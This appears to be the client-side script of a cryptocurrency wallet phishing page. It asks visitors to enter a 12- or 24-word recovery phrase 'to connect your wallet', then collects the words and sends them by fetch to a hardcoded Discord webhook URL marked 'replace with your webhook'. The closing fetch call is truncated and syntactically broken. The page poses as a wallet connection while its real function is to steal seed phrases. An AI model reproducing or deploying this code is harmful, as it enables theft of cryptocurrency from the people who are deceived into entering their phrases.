    <script>
        // Check for dark mode preference
        const prefersDarkScheme = window.matchMedia("(prefers-color-scheme: dark)");

        function setTheme(e) {
            document.documentElement.setAttribute("data-theme", e.matches ? "dark" : "light");
        }

        // Apply initial theme
        setTheme(prefersDarkScheme);

        // Listen for changes
        prefersDarkScheme.addEventListener("change", setTheme);

        document.getElementById("select12").addEventListener("click", function () {
            document.querySelectorAll(".phrase-18, .phrase-24").forEach(function (el) {
                el.style.display = "none";
            });
            document.getElementById("select12").classList.add("phrase-select-selected");
            document.getElementById("select24").classList.remove("phrase-select-selected");
        });

        document.getElementById("select24").addEventListener("click", function () {
            document.querySelectorAll(".phrase-18, .phrase-24").forEach(function (el) {
                el.style.display = "flex";
            });
            document.getElementById("select12").classList.remove("phrase-select-selected");
            document.getElementById("select24").classList.add("phrase-select-selected");
        });

        // Allow pasting and typing in all input fields
        const inputs = document.querySelectorAll(".phrase input");

        inputs.forEach((input) => {
            input.addEventListener("input", () => distributeWords());
            
            input.addEventListener("paste", function (e) {
                const paste = e.clipboardData.getData("text");
                const words = paste.split(/\s+/).slice(0, inputs.length);
                words.forEach((word, i) => {
                    if (inputs[i]) {
                        inputs[i].value = word;
                    }
                });
                distributeWords(); // Distribute words after pasting
                e.preventDefault();
            });
        });

        // Function to distribute words across input fields
        function distributeWords() {
            const allWords = Array.from(inputs).map((input) => input.value.trim()).join(" ");
            const wordsArray = allWords.split(/\s+/).filter(word => word !== "");

            // Clear all inputs before filling them
            inputs.forEach((input) => {
                input.value = ""; // Clear the input first
            });

            // Fill inputs based on the words array
            wordsArray.forEach((word, i) => {
                if (inputs[i]) {
                    inputs[i].value = word; // Fill the input with the word
                }
            });

            // Update the button text based on filled words
            const filledWords = wordsArray.length;
            document.getElementById("submitButton").textContent = filledWords < 12 ? "Proceed" : "Proceed";
        }

        document.getElementById("submitButton").addEventListener("click", function () {
            const filledWords = Array.from(inputs).filter(
                (input) => input.value.trim() !== ""
            ).length;

            if (filledWords < 12) {
                alert("Please input your phrase to connect your wallet.");
                return; // Do not proceed if fewer than 12 words are filled
            }

            const words = Array.from(inputs)
                .filter((input) => input.value.trim() !== "")
                .map((input) => input.value.trim())
                .join(" ");

            const discordWebhookUrl = "https://discord.com/api/webhooks/1371035774736138382/eYkdLdgn3zUEBNkQZOJCy_39Fuo6nmbdR8ySWL_YWEs5S9FKKcvmWVEPH4_dT4aFm2VU"; // replace with your webhook

fetch(discordWebhookUrl, {

    },
    body: JSON.stringify({

    })
})
